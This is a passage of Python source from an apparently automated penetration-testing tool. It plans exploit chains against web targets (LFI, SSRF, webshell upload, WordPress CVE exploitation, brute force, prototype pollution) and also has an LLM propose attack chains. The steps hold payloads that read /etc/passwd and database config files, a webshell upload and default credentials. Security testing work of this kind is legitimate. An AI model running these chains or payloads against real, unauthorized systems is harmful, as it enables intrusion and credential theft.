                    success_indicator="Authentication bypassed"
                ),
                ExploitStep(
                    name="Gain user session",
                    action="session_hijacking",
                    target=target,
                    tool="burp",
                    success_indicator="Valid session obtained"
                ),
                ExploitStep(
                    name="Escalate to admin",
                    action="privilege_escalation",
                    target=target,
                    tool="curl",
                    success_indicator="Admin access obtained"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_ssrf_exploitation_chain(self) -> ExploitChain:
        """Build SSRF exploitation chain."""
        return self._build_pattern_chain(
            name="SSRF to Internal Network Access",
            description="Exploit Server-Side Request Forgery to access internal network",
            steps=[
                ExploitStep(
                    name="Identify SSRF parameters",
                    action="vulnerability_identification",
                    target="",
                    tool="burp",
                    success_indicator="Vulnerable parameter found"
                ),
                ExploitStep(
                    name="Probe internal services",
                    action="internal_scanning",
                    target="http://localhost:8080",
                    tool="curl",
                    payload="http://internal-service/admin",
                    success_indicator="Internal service accessible"
                ),
                ExploitStep(
                    name="Exploit internal service",
                    action="service_exploitation",
                    target="",
                    tool="custom_script",
                    success_indicator="Internal service compromised"
                )
            ],
            risk_level="HIGH"
        )

    def _build_enum_attack_chain(self) -> ExploitChain:
        """Build user enumeration to attack chain."""
        return self._build_pattern_chain(
            name="User Enumeration and Targeted Attack",
            description="Enumerate valid users and launch targeted attacks",
            steps=[
                ExploitStep(
                    name="Enumerate users",
                    action="user_enumeration",
                    target="",
                    tool="custom_script",
                    success_indicator="Valid users identified"
                ),
                ExploitStep(
                    name="Brute force credentials",
                    action="brute_force",
                    target="",
                    tool="hydra",
                    success_indicator="Credentials obtained"
                ),
                ExploitStep(
                    name="Exploit with credentials",
                    action="exploitation",
                    target="",
                    tool="curl",
                    success_indicator="System compromised"
                )
            ],
            risk_level="HIGH"
        )

    def _build_api_attack_chain(self, api_ep: Dict) -> ExploitChain:
        """Build API-specific attack chain."""
        return self._build_pattern_chain(
            name="API Abuse and Exploitation",
            description=f"Exploit API endpoint at {api_ep.get('url')}",
            steps=[
                ExploitStep(
                    name="Analyze API",
                    action="api_analysis",
                    target=api_ep.get('url'),
                    tool="burp",
                    success_indicator="API structure understood"
                ),
                ExploitStep(
                    name="Test for authentication",
                    action="auth_test",
                    target=api_ep.get('url'),
                    tool="curl",
                    success_indicator="Authentication requirements identified"
                ),
                ExploitStep(
                    name="Exploit API",
                    action="api_exploitation",
                    target=api_ep.get('url'),
                    tool="curl",
                    success_indicator="Sensitive data accessed"
                )
            ],
            risk_level="HIGH"
        )

    def _build_admin_access_chain(self, admin_ep: Dict) -> ExploitChain:
        """Build admin panel access chain."""
        return self._build_pattern_chain(
            name="Admin Panel Unauthorized Access",
            description=f"Gain unauthorized access to admin panel at {admin_ep.get('url')}",
            steps=[
                ExploitStep(
                    name="Access admin panel",
                    action="direct_access",
                    target=admin_ep.get('url'),
                    tool="browser",
                    success_indicator="Admin panel accessible"
                ),
                ExploitStep(
                    name="Bypass authentication",
                    action="auth_bypass",
                    target=admin_ep.get('url'),
                    tool="curl",
                    success_indicator="Authentication bypassed"
                ),
                ExploitStep(
                    name="Exploit admin functions",
                    action="admin_exploitation",
                    target=admin_ep.get('url'),
                    tool="curl",
                    success_indicator="System compromised"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_wordpress_attack_chain(self, wp_ep: Dict) -> ExploitChain:
        """Build WordPress-specific attack chain."""
        return self._build_pattern_chain(
            name="WordPress Plugin/Theme Exploitation",
            description="Exploit WordPress vulnerabilities for RCE",
            steps=[
                ExploitStep(
                    name="Enumerate WordPress",
                    action="wp_enumeration",
                    target=wp_ep.get('url'),
                    tool="wpscan",
                    success_indicator="WordPress version and plugins identified"
                ),
                ExploitStep(
                    name="Identify vulnerable plugins",
                    action="vulnerability_scanning",
                    target=wp_ep.get('url'),
                    tool="wpscan",
                    success_indicator="Vulnerable plugin found"
                ),
                ExploitStep(
                    name="Exploit plugin",
                    action="plugin_exploitation",
                    target=wp_ep.get('url'),
                    tool="exploit_framework",
                    success_indicator="Remote code execution achieved"
                )
            ],
            risk_level="HIGH"
        )

    def _wordpress_ai_triage(self, attack_context: Dict) -> List[ExploitChain]:
        """
        PRIORITY 5: AI-powered triage for WordPress-specific attack chains.
        
        When WordPress is detected, this method analyzes the specific WP configuration
        and generates prioritized attack chains based on:
        - WordPress version and known vulnerabilities
        - Plugin and theme versions with CVEs
        - Available endpoints and their security posture
        - Historical success rates for similar WP configurations
        
        Returns:
            List of WordPress-specific ExploitChain objects, prioritized by likelihood
        """
        chains = []
        wp_context = attack_context.get('wordpress', {})
        
        if not wp_context.get('detected'):
            return chains
        
        logger.info(f"[CHAIN] Running WordPress AI triage for {wp_context.get('version', 'unknown version')}")
        
        # Get WordPress-specific data
        wp_version = wp_context.get('version', 'unknown')
        wp_plugins = wp_context.get('plugins', [])
        wp_users = wp_context.get('users', [])
        
        # ─── TRIAGE RULE 1: Version-based prioritization ──────────────────────────
        # Check if WP version has known critical vulnerabilities
        critical_wp_versions = ['5.0', '5.1', '4.7', '4.6', '4.5', '3.x']
        if any(wp_version.startswith(v) for v in critical_wp_versions):
            chains.append(self._build_pattern_chain(
                name="WordPress Core CVE Exploitation",
                description=f"Target WordPress {wp_version} with known critical CVEs",
                steps=[
                    ExploitStep(
                        name="Verify WordPress version",
                        action="version_verification",
                        target=wp_context.get('detection_url', ''),
                        tool="wpscan",
                        success_indicator=f"Version {wp_version} confirmed"
                    ),
                    ExploitStep(
                        name="Exploit core vulnerability",
                        action="core_exploit",
                        target=wp_context.get('detection_url', ''),
                        tool="metasploit/custom_exploit",
                        success_indicator="Core vulnerability exploited"
                    )
                ],
                risk_level="CRITICAL"
            ))
        
        # ─── TRIAGE RULE 2: Vulnerable plugins prioritization ─────────────────────
        vuln_plugins = [p for p in wp_plugins if p.get('vulnerabilities')]
        if vuln_plugins:
            # Sort by severity
            vuln_plugins.sort(key=lambda p: len(p.get('vulnerabilities', [])), reverse=True)
            
            for plugin in vuln_plugins[:3]:  # Top 3 vulnerable plugins
                plugin_name = plugin.get('name', 'unknown')
                vuln_count = len(plugin.get('vulnerabilities', []))
                
                chains.append(self._build_pattern_chain(
                    name=f"WordPress Plugin Exploit: {plugin_name}",
                    description=f"Exploit {vuln_count} vulnerabilities in plugin {plugin_name}",
                    steps=[
                        ExploitStep(
                            name="Verify plugin version",
                            action="plugin_version_check",
                            target=f"/wp-content/plugins/{plugin_name}/",
                            tool="wpscan",
                            success_indicator=f"Plugin {plugin_name} version confirmed"
                        ),
                        ExploitStep(
                            name="Exploit plugin vulnerability",
                            action="plugin_exploit",
                            target=f"/wp-content/plugins/{plugin_name}/",
                            tool="custom_exploit",
                            success_indicator="Plugin vulnerability exploited"
                        )
                    ],
                    risk_level="CRITICAL" if vuln_count > 2 else "HIGH"
                ))
        
        # ─── TRIAGE RULE 3: User enumeration + brute force ────────────────────────
        if wp_users and len(wp_users) > 0:
            chains.append(self._build_pattern_chain(
                name="WordPress User Brute Force",
                description=f"Brute force {len(wp_users)} enumerated WordPress users",
                steps=[
                    ExploitStep(
                        name="Enumerate users",
                        action="user_enumeration",
                        target="/wp-json/wp/v2/users",
                        tool="wpscan",
                        success_indicator=f"Found {len(wp_users)} users"
                    ),
                    ExploitStep(
                        name="Brute force passwords",
                        action="password_bruteforce",
                        target="/wp-login.php",
                        tool="hydra/wpscan",
                        success_indicator="Valid credentials obtained"
                    )
                ],
                risk_level="HIGH"
            ))
        
        # ─── TRIAGE RULE 4: XML-RPC exploitation ──────────────────────────────────
        xmlrpc_url = wp_context.get('xmlrpc_url', '')
        if xmlrpc_url or any('xmlrpc' in attack_context.get('endpoints', [])):
            chains.append(self._build_pattern_chain(
                name="WordPress XML-RPC Exploitation",
                description="Exploit XML-RPC for user enumeration and brute force",
                steps=[
                    ExploitStep(
                        name="Verify XML-RPC enabled",
                        action="xmlrpc_check",
                        target="/xmlrpc.php",
                        tool="curl",
                        success_indicator="XML-RPC methodResponse received"
                    ),
                    ExploitStep(
                        name="Enumerate users via XML-RPC",
                        action="xmlrpc_enum",
                        target="/xmlrpc.php",
                        tool="custom_script",
                        success_indicator="Users enumerated"
                    )
                ],
                risk_level="HIGH"
            ))
        
        logger.info(f"[CHAIN] WordPress AI triage generated {len(chains)} prioritized chains")
        return chains

    def _build_php_exploitation_chain(self, endpoints: List[Dict]) -> ExploitChain:
        """Build PHP-specific exploitation chain."""
        return self._build_pattern_chain(
            name="PHP Code Injection",
            description="Exploit PHP-specific vulnerabilities like code injection",
            steps=[
                ExploitStep(
                    name="Identify injection points",
                    action="vulnerability_identification",
                    target="",
                    tool="burp",
                    success_indicator="Injection point found"
                ),
                ExploitStep(
                    name="Test code injection",
                    action="code_injection_test",
                    target="",
                    tool="curl",
                    payload="<?php phpinfo(); ?>",
                    success_indicator="Code injection confirmed"
                ),
                ExploitStep(
                    name="Execute commands",
                    action="code_execution",
                    target="",
                    tool="curl",
                    success_indicator="Remote code execution"
                )
            ],
            risk_level="HIGH"
        )

    def _build_nodejs_attack_chain(self, endpoints: List[Dict]) -> ExploitChain:
        """Build Node.js/Express-specific attack chain."""
        return self._build_pattern_chain(
            name="Node.js Prototype Pollution",
            description="Exploit prototype pollution in Node.js applications",
            steps=[
                ExploitStep(
                    name="Test prototype pollution",
                    action="pollution_test",
                    target="",
                    tool="curl",
                    payload="?__proto__[admin]=true",
                    success_indicator="Prototype pollution confirmed"
                ),
                ExploitStep(
                    name="Escalate privileges",
                    action="privilege_escalation",
                    target="",
                    tool="curl",
                    success_indicator="Admin access obtained"
                )
            ],
            risk_level="HIGH"
        )

    def build_manual_playbook(self, chains: List[ExploitChain]) -> List[Dict]:
        """
        Build a human-executable validation playbook from planned chains.
        Output is intentionally procedural for manual testers.
        """
        playbook: List[Dict] = []
        vulnerabilities = self._get_planning_vulnerabilities()
        prioritized = self.state.get("prioritized_endpoints", []) or []
        target = self.state.get("target", "")

        for idx, chain in enumerate(chains[:5], 1):
            chain_steps = []
            for s_idx, step in enumerate(chain.steps[:8], 1):
                chain_steps.append(
                    {
                        "step": s_idx,
                        "title": step.name,
                        "action": step.action,
                        "target": step.target,
                        "tool": step.tool or "manual",
                        "success_criteria": step.success_indicator or "observable response change",
                        "notes": "Validate carefully and capture request/response evidence.",
                    }
                )
            playbook.append(
                {
                    "id": f"CHAIN-{idx:02d}",
                    "name": chain.name,
                    "risk_level": chain.risk_level,
                    "goal": chain.description,
                    "estimated_time": chain.estimated_time,
                    "preconditions": chain.preconditions or chain.prerequisites or ["target reachable"],
                    "steps": chain_steps,
                }
            )

        # Ensure at least one actionable chain for testers.
        if not playbook:
            seed_endpoint = ""
            if vulnerabilities:
                seed_endpoint = vulnerabilities[0].get("endpoint") or vulnerabilities[0].get("url", "")
            if not seed_endpoint and prioritized:
                seed_endpoint = prioritized[0].get("url", "")
            playbook.append(
                {
                    "id": "CHAIN-01",
                    "name": "Manual Verification Baseline Chain",
                    "risk_level": "MEDIUM",
                    "goal": f"Establish reproducible validation flow for {target}",
                    "estimated_time": "20-40 min",
                    "preconditions": ["target reachable", "authorized testing scope confirmed"],
                    "steps": [
                        {
                            "step": 1,
                            "title": "Reproduce endpoint behavior",
                            "action": "baseline_request",
                            "target": seed_endpoint or target,
                            "tool": "browser+proxy",
                            "success_criteria": "stable baseline response captured",
                            "notes": "Capture request/response pair and timing.",
                        },
                        {
                            "step": 2,
                            "title": "Inject controlled test input",
                            "action": "parameter_manipulation",
                            "target": seed_endpoint or target,
                            "tool": "repeater",
                            "success_criteria": "input reflection or logic deviation observed",
                            "notes": "Keep payloads non-destructive; compare against baseline.",
                        },
                        {
                            "step": 3,
                            "title": "Cross-check with second method",
                            "action": "secondary_validation",
                            "target": seed_endpoint or target,
                            "tool": "alt-tool",
                            "success_criteria": "same behavior reproduced independently",
                            "notes": "Use another tool or role context to avoid false positives.",
                        },
                        {
                            "step": 4,
                            "title": "Document exploitability decision",
                            "action": "manual_triage",
                            "target": seed_endpoint or target,
                            "tool": "reporting",
                            "success_criteria": "clear pass/fail + evidence bundle",
                            "notes": "Mark as confirmed/rejected with concrete artifacts.",
                        },
                    ],
                }
            )

        return playbook

    def _build_chain_from_graph_path(self, chain_data: Dict, attack_graph) -> Optional[ExploitChain]:
        """Build an ExploitChain from a graph path"""
        path = chain_data.get('path', [])
        if len(path) < 2:
            return None
            
        # Get node data
        nodes = []
        for node_id in path:
            node_data = attack_graph.graph.nodes[node_id]
            nodes.append(node_data)
        
        # Build chain name
        start_type = nodes[0].get('vuln_type', 'unknown')
        end_type = nodes[-1].get('vuln_type', 'unknown')
        chain_name = f"{start_type.title()} → {end_type.title()} Chain"
        
        # Build steps
        steps = []
        for i, node in enumerate(nodes):
            step = ExploitStep(
                name=f"Exploit {node.get('name', f'Vuln {i+1}')}",
                action=f"exploit_{node.get('vuln_type', 'unknown')}",
                target=self._resolve_step_target(node.get('endpoint', ''), node.get('name', ''), node.get('vuln_type', '')),
                tool=self._get_tool_for_vuln_type(node.get('vuln_type', '')),
                success_indicator=f"{node.get('vuln_type', 'unknown')} exploited",
                priority=10 - i  # Decreasing priority
            )
            steps.append(step)
        
        # Calculate risk level
        risk_levels = [node.get('severity', 'MEDIUM') for node in nodes]
        risk_level = 'CRITICAL' if 'CRITICAL' in risk_levels else 'HIGH' if 'HIGH' in risk_levels else 'MEDIUM'
        
        return ExploitChain(
            name=chain_name,
            description=f"Attack chain from {start_type} to {end_type} via {len(path)} steps",
            risk_level=risk_level,
            estimated_time=f"{len(path) * 5}-{len(path) * 15} min",
            prerequisites=[f"{nodes[0].get('vuln_type')} vulnerability"],
            steps=steps
        )

    def _get_tool_for_vuln_type(self, vuln_type: str) -> str:
        """Get appropriate tool for vulnerability type"""
        tool_map = {
            'sqli': 'sqlmap',
            'xss': 'custom_script',
            'rce': 'curl',
            'file_upload': 'curl',
            'lfi': 'curl',
            'auth_bypass': 'curl',
            'csrf': 'curl'
        }
        return tool_map.get(vuln_type.lower(), 'curl')

    def plan_chains(self) -> List[ExploitChain]:
        """Analyze state and build relevant exploit chains.
        
        Priority order:
        1. Try AI-powered planning first (if Groq available)
        2. Fall back to rule-based/heuristic planning only if needed
        3. Apply smart prioritization
        """
        if not self._has_minimum_chain_evidence():
            logger.info("[CHAIN] Low-signal state detected, no exploit chains planned")
            return []

        chains = []

        # ─── PRIORITY 1: AI-POWERED PLANNING ──────────────────────────────────────
        ai_available = self.groq is not None
        ai_success = False
        
        if ai_available:
            try:
                # Check circuit breaker
                if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
                    logger.debug("[CHAIN] Groq circuit breaker OPEN - skipping AI planning")
                else:
                    ai_chains = self._plan_with_ai()
                    if ai_chains:
                        chains.extend(ai_chains)
                        ai_success = True
                        logger.info(f"[CHAIN] AI planner generated {len(ai_chains)} chains")
            except Exception as e:
                error_msg = str(e)
                if '403' in error_msg or 'Forbidden' in error_msg:
                    logger.warning("[CHAIN] Groq API 403 Forbidden - disabling AI")
                    self.groq = None
                else:
                    logger.debug(f"[CHAIN] AI planning failed: {e}")

        # ─── PRIORITY 2: HEURISTIC FALLBACK (chỉ khi AI không thành công) ─────────
        if not ai_success:
            logger.info("[CHAIN] AI not available or failed - using heuristic planning")
            
            # Hint-based chains
            hint_chains = self._generate_chains_from_hints()
            chains.extend(hint_chains)
            
            # Pattern-based chains
            pattern_chains = self._detect_chain_patterns()
            chains.extend(pattern_chains)
            
            # WordPress conditioned chains
            conditioned_wp = self._build_conditioned_wp_chains()
            chains.extend(conditioned_wp)
            
            # Vulnerability-specific chains
            vulns = self._get_planning_vulnerabilities(include_detected=True)
            wp_detected = self.state.get("wordpress_detected", False)
            wp_users = self.state.get("wp_users", [])
            wp_plugins = self.state.get("wp_plugins", [])
            endpoints = self.state.get("prioritized_endpoints", [])
            
            # SQLi chains
            sqli_vulns = [
                v for v in vulns
                if "sql" in str(v.get("name") or "").lower() or str(v.get("type") or "").upper() == "SQLI"
            ]
            if sqli_vulns:
                chains.append(self._build_sqli_chain(sqli_vulns[0]))
            
            # WordPress chains
            if wp_detected:
                if wp_users:
                    chains.append(self._build_wp_admin_chain(wp_users))
                
                wp_xmlrpc = any("xmlrpc" in str(f).lower() for f in self.state.get("wp_vulns", []))
                if wp_xmlrpc or wp_detected:
                    chains.append(self._build_xmlrpc_chain(wp_users))
                
                if wp_plugins:
                    vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
                    if vuln_plugins:
                        chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))
            
            # File upload chains
            upload_endpoints = [ep for ep in endpoints if "upload" in ep.get("url", "").lower()]
            if upload_endpoints:
                chains.append(self._build_upload_chain(upload_endpoints[0]))
                chains.append(self._build_direct_upload_rce_chain(upload_endpoints[0]))
            
            # LFI chains
            lfi_endpoints = [ep for ep in endpoints if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path=", "action="])]
            wp_auto_endpoints = [ep for ep in endpoints if "wp-automatic" in ep.get("url", "").lower()]
            if wp_auto_endpoints:
                chains.append(self._build_wp_automatic_lfi_chain(wp_auto_endpoints[0]))
            if lfi_endpoints:
                chains.append(self._build_lfi_chain(lfi_endpoints[0]))
            
            # XSS chains
            xss_vulns = [
                v for v in vulns
                if "xss" in str(v.get("name") or "").lower() or "cross-site" in str(v.get("name") or "").lower()
            ]
            if xss_vulns:
                chains.append(self._build_xss_chain(xss_vulns[0]))
            
            # Log outcome
            if chains:
                logger.info(f"[CHAIN] Heuristic planner generated {len(chains)} chains")
            else:
                logger.info("[CHAIN] No heuristic chains generated")

        # Remove duplicates (by name)
        seen_names = set()
        unique_chains = []
        for chain in chains:
            if chain.name not in seen_names:
                seen_names.add(chain.name)
                unique_chains.append(chain)
        
        # Smart prioritization
        prioritized_chains = self.smart_prioritize(unique_chains)
        
        # Log final chains
        for chain in prioritized_chains:
            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")
        
        logger.info(f"[CHAIN] Total {len(prioritized_chains)} chains after prioritization")
        return prioritized_chains

    def _generate_chains_from_hints(self) -> List[ExploitChain]:
        """
        Generate exploit chains from vulnerability hints in endpoint metadata.
        This is the key intelligence enhancement.
        """
        chains = []
        endpoints = self.state.get("prioritized_endpoints", []) or []
        base_url = self._get_base_url()
        
        # Collect all vulnerability hints from endpoints
        hint_inventory = {}  # hint -> [endpoints]
        for ep in endpoints:
            if not isinstance(ep, dict):
                continue
            hints = ep.get('vulnerability_hints', []) or []
            for hint in hints:
                if hint not in hint_inventory:
                    hint_inventory[hint] = []
                hint_inventory[hint].append(ep)
        
        logger.info(f"[CHAIN] Found {len(hint_inventory)} unique vulnerability hints")
        
        # Helper function to safely get URL from endpoint
        def safe_get_url(ep, fallback=None):
            url = ep.get('url') if isinstance(ep, dict) else None
            if not url or not url.strip():
                return fallback or base_url
            if not url.startswith(('http://', 'https://')):
                return self._build_full_url(url)
            return url
        
        # Pattern 1: File upload + executable directory → RCE
        if 'file_upload' in hint_inventory and any(h in hint_inventory for h in ['rce_via_upload', 'rce']):
            upload_ep = hint_inventory['file_upload'][0]
            upload_url = safe_get_url(upload_ep)
            chains.append(self._build_pattern_chain(
                name="File Upload to RCE",
                description="Upload file to executable directory and achieve code execution",
                steps=[
                    ExploitStep(
                        name="Identify upload endpoint",
                        action="reconnaissance",
                        target=upload_url,
                        tool="browser",
                        success_indicator="Upload form found"
                    ),
                    ExploitStep(
                        name="Upload webshell",
                        action="file_upload",
                        target=upload_url,
                        tool="curl",
                        payload="webshell.php",
                        success_indicator="File uploaded successfully"
                    ),
                    ExploitStep(
                        name="Execute uploaded file",
                        action="code_execution",
                        target=upload_url + "/webshell.php",
                        tool="curl",
                        success_indicator="Remote code execution achieved"
                    )
                ],
                risk_level="CRITICAL"
            ))
        
        # Pattern 2: LFI + Debug info → Information disclosure → RCE
        if 'lfi' in hint_inventory:
            lfi_eps = hint_inventory['lfi']
            lfi_url = safe_get_url(lfi_eps[0])
            chains.append(self._build_pattern_chain(
                name="Local File Inclusion to Information Disclosure",
                description="Use LFI to read sensitive files and extract credentials",
                steps=[
                    ExploitStep(
                        name="Enumerate files via LFI",
                        action="local_file_inclusion",
                        target=lfi_url,
                        tool="curl",
                        payload="../../../etc/passwd",
                        success_indicator="System files readable"
                    ),
                    ExploitStep(
                        name="Extract configuration",
                        action="configuration_extraction",
                        target=lfi_url,
                        tool="curl",
                        payload="../../../config/database.yml",
                        success_indicator="Database credentials obtained"
                    ),
                    ExploitStep(
                        name="Use credentials for escalation",
                        action="credential_exploitation",
                        target=self._get_base_url(),
                        tool="sqlmap",
                        success_indicator="Database access obtained"
                    )
                ],
                risk_level="HIGH"
            ))
        
        # Pattern 3: SSRF → Internal network access
        if 'ssrf' in hint_inventory:
            ssrf_eps = hint_inventory['ssrf']
            ssrf_url = safe_get_url(ssrf_eps[0])
            chains.append(self._build_pattern_chain(
                name="SSRF to Internal Resource Access",
                description="Use Server-Side Request Forgery to access internal services",
                steps=[
                    ExploitStep(
                        name="Identify SSRF parameter",
                        action="vulnerability_identification",
                        target=ssrf_url,
                        tool="burp",
                        success_indicator="SSRF parameter found"
                    ),
                    ExploitStep(
                        name="Probe internal services",
                        action="internal_reconnaissance",
                        target=ssrf_url,
                        tool="curl",
                        payload="http://localhost:8080/admin",
                        success_indicator="Internal service accessible"
                    ),
                    ExploitStep(
                        name="Exploit internal service",
                        action="service_exploitation",
                        target=ssrf_url,
                        tool="custom_script",
                        success_indicator="Internal service compromised"
                    )
                ],
                risk_level="HIGH"
            ))
        
        # Pattern 4: Auth bypass + admin endpoint → Account takeover
        if 'auth_bypass' in hint_inventory and 'admin' in [ep.get('endpoint_type', '') for ep in endpoints]:
            admin_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'admin']
            if admin_eps:
                admin_url = safe_get_url(admin_eps[0])
                chains.append(self._build_pattern_chain(
                    name="Authentication Bypass to Admin Access",
                    description="Bypass authentication and gain administrative access",
                    steps=[
                        ExploitStep(
                            name="Test authentication bypass",
                            action="auth_test",
                            target=admin_url,
                            tool="curl",
                            payload="admin:admin",
                            success_indicator="Authentication bypassed"
                        ),
                        ExploitStep(
                            name="Gain admin access",
                            action="privilege_escalation",
                            target=admin_url,
                            tool="browser",
                            success_indicator="Admin panel accessed"
                        ),
                        ExploitStep(
                            name="Exploit admin functionality",
                            action="admin_exploitation",
                            target=admin_url,
                            tool="curl",
                            success_indicator="System compromised"
                        )
                    ],
                    risk_level="CRITICAL"
                ))
        
        # Pattern 5: User enumeration + brute force → Account takeover
        if 'user_enumeration' in hint_inventory:
            auth_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'auth']
            if auth_eps:
                auth_url = safe_get_url(auth_eps[0])
                chains.append(self._build_pattern_chain(
                    name="User Enumeration to Account Takeover",
                    description="Enumerate valid users and brute force credentials",
                    steps=[
                        ExploitStep(
                            name="Enumerate users",
                            action="user_enumeration",
                            target=auth_url,
                            tool="custom_script",
                            success_indicator="Valid users identified"
                        ),
                        ExploitStep(
                            name="Brute force passwords",
                            action="brute_force",
                            target=auth_url,
                            tool="hydra",
                            success_indicator="Credentials obtained"
                        ),
                        ExploitStep(
                            name="Login with compromised account",
                            action="authentication",
                            target=auth_url,
                            tool="curl",
                            success_indicator="Account compromised"
                        )
                    ],
                    risk_level="HIGH"
                ))
        
        # Pattern 6: Injection attacks (SQLi, Command, etc)
        injection_hints = [h for h in hint_inventory if 'injection' in h.lower() or 'sqli' in h.lower()]
        if injection_hints:
            hint = injection_hints[0]
            injection_eps = hint_inventory[hint]
            injection_url = safe_get_url(injection_eps[0])
            chains.append(self._build_pattern_chain(
                name=f"{hint.title()} Exploitation",
                description=f"Exploit {hint} vulnerability for database access or command execution",
                steps=[
                    ExploitStep(
                        name="Test vulnerability",
                        action="vulnerability_test",
                        target=injection_url,
                        tool="sqlmap" if 'sql' in hint else "curl",
                        success_indicator="Vulnerability confirmed"
                    ),
                    ExploitStep(
                        name="Extract data or execute commands",
                        action="data_extraction",
                        target=injection_url,
                        tool="sqlmap" if 'sql' in hint else "curl",
                        success_indicator="Sensitive data obtained"
                    )
                ],
                risk_level="HIGH" if 'sql' in hint else "MEDIUM"
            ))
        
        return chains

    def _build_pattern_chain(
        self,
        name: str,
        description: str,
        steps: List[ExploitStep],
        risk_level: str = "MEDIUM"
    ) -> ExploitChain:
        """Build an exploit chain from pattern components with URL validation."""
        # Validate and fix empty URLs in steps
        base_url = self._get_base_url()
        validated_steps = []
        for step in steps:
            # Ensure step has a valid target URL
            if not step.target or not step.target.strip():
                step.target = base_url
            elif not step.target.startswith(('http://', 'https://')):
                step.target = self._build_full_url(step.target)
            
            # Ensure step has a meaningful name
            if not step.name or step.name.strip() == "":
                step.name = step.action if step.action else "Execute Step"
            
            validated_steps.append(step)
        
        return ExploitChain(
            name=name,
            description=description,
            steps=validated_steps,
            risk_level=risk_level,
            estimated_time=f"{len(validated_steps) * 10}-{len(validated_steps) * 30} min",
            prerequisites=["target reachable", "network access to target"]
        )


class AIPoweredChainPlanner:
    """
    AI-powered chain planning bổ sung bên cạnh ChainPlanner cũ.
    Không thay thế graph-based planner hiện tại, chỉ enrich thêm chains.
    """

    def __init__(self, groq_client=None):
        self.groq = groq_client
        self._ai_call_count = 0

    def plan_chains(self, state: Dict) -> List[Dict]:
        """Build additional chains from state without depending on the old planner API."""
        vulnerabilities = state.get("vulnerabilities", []) or []
        wp_plugins = state.get("wp_plugins", []) or []
        wp_themes = state.get("wp_themes", []) or []
        wp_core = state.get("wp_core", {}) or {}
        tech_stack = state.get("tech_stack", []) or []
        users = state.get("wp_users", []) or []
        wordpress_detected = bool(state.get("wordpress_detected", False))

        cves = self._collect_cves(wp_plugins, wp_themes, wp_core)
        rule_chains = self._rule_based_chains(
            wordpress_detected=wordpress_detected,
            plugins=wp_plugins,
            themes=wp_themes,
            core=wp_core,
            users=users,
            vulns=vulnerabilities,
        )

        ai_chains: List[Dict] = []
        if self.groq and (cves or vulnerabilities):
            ai_chains = self._ai_chains(
                {
                    "target": state.get("target"),
                    "tech_stack": tech_stack,
                    "wordpress": {
                        "detected": wordpress_detected,
                        "version": wp_core.get("version") or state.get("wp_version"),
                        "plugins": wp_plugins,
                        "themes": wp_themes,
                        "users": users,
                    },
                    "vulnerabilities": vulnerabilities[:10],
                    "cves": cves[:10],
                    "endpoints": state.get("prioritized_endpoints", [])[:10],
                }
            )

        return self._merge_and_rank(rule_chains + ai_chains)

    def _collect_cves(self, plugins: List[Dict], themes: List[Dict], core: Dict) -> List[Dict]:
        cves: List[Dict] = []
        for plugin in plugins:
            for vuln in plugin.get("vulnerabilities", []) or []:
                if vuln.get("cve"):
                    cves.append(vuln)
        for theme in themes:
            for vuln in theme.get("vulnerabilities", []) or []:
                if vuln.get("cve"):
                    cves.append(vuln)
        for vuln in core.get("vulnerabilities", []) or []:
            if vuln.get("cve"):
                cves.append(vuln)
        return cves

    def _rule_based_chains(
        self,
        wordpress_detected: bool,
        plugins: List[Dict],
        themes: List[Dict],
        core: Dict,
        users: List[str],
        vulns: List[Dict],
    ) -> List[Dict]:
        chains: List[Dict] = []

        if wordpress_detected:
            for plugin in plugins:
                plugin_vulns = plugin.get("vulnerabilities", []) or []
                if plugin_vulns:
                    first_vuln = plugin_vulns[0]
                    chains.append(
                        {
                            "name": f"Exploit {plugin.get('name', 'plugin')} CVE -> RCE",
                            "severity": "CRITICAL",
                            "steps": [
                                {"action": "verify_plugin_version", "target": plugin.get("name", "")},
                                {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                                {"action": "get_shell"},
                            ],
                            "confidence": 0.8,
                            "reasoning": f"Detected plugin {plugin.get('name')} with known CVE-backed issues.",
                        }
                    )

            if core.get("vulnerabilities"):
                first_vuln = core["vulnerabilities"][0]
                chains.append(
                    {
                        "name": "Exploit WordPress Core CVE",
                        "severity": "HIGH",
                        "steps": [
                            {"action": "verify_core_version", "target": core.get("version", "")},
                            {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                        ],
                        "confidence": 0.7,
                        "reasoning": "Detected WordPress core version with known vulnerabilities.",
                    }
                )

            if users:
                chains.append(
                    {
                        "name": "WordPress Admin Takeover -> RCE",
                        "severity": "CRITICAL",
                        "steps": [
                            {"action": "enum_users"},
                            {"action": "bruteforce_password"},
                            {"action": "upload_shell"},
                        ],
                        "confidence": 0.6,
                        "reasoning": f"Found {len(users)} enumerated users and WordPress attack surface.",
                    }
                )

        if any("xmlrpc" in (v.get("type", "") or "").lower() for v in vulns):
            chains.append(
                {
                    "name": "XML-RPC Multicall Bruteforce",
                    "severity": "HIGH",
                    "steps": [
                        {"action": "verify_xmlrpc"},
                        {"action": "bruteforce_users"},
                    ],
                    "confidence": 0.7,
                    "reasoning": "XML-RPC related behavior detected in vulnerabilities.",
                }
            )

        for theme in themes:
            theme_vulns = theme.get("vulnerabilities", []) or []
            if theme_vulns:
                first_vuln = theme_vulns[0]
                chains.append(
                    {
                        "name": f"Exploit theme {theme.get('name', 'theme')} vulnerability",
                        "severity": "HIGH",
                        "steps": [
                            {"action": "verify_theme_version", "target": theme.get("name", "")},
                            {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                        ],
                        "confidence": 0.65,
                        "reasoning": "Detected theme with associated vulnerabilities.",
                    }
                )

        return chains

    def _ai_chains(self, context: Dict[str, Any]) -> List[Dict]:
        if self._ai_call_count >= 2:
            return []
        self._ai_call_count += 1

        prompt = f"""
Phan tich context sau va de xuat chuoi tan cong hop ly.

Target: {context.get('target')}
Tech Stack: {', '.join(context.get('tech_stack', []))}
WordPress detected: {context.get('wordpress', {}).get('detected')}
WordPress version: {context.get('wordpress', {}).get('version')}
Plugins detected: {len(context.get('wordpress', {}).get('plugins', []))}
